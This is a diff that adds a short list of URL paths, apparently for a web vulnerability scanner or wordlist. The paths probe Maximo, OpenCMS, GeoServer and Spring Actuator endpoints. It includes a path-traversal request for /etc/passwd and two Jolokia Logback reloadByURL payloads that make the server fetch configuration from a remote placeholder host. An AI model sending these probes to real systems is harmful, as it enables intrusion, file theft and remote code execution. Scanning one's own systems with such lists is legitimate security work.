@@ -1,0 +1,10 @@
+/v2/api/product/manger/getInfo
+/os/mxperson
+/meaweb/os/mxperson
+/?layout=/etc/passwd
+/opencms/cmisatom/cmis-online/query
+/cmisatom/cmis-online/query
+/geoserver/wfs?service=WMS&request=GetMap
+/wfs?service=WMS&request=GetMap
+/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml
+/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml
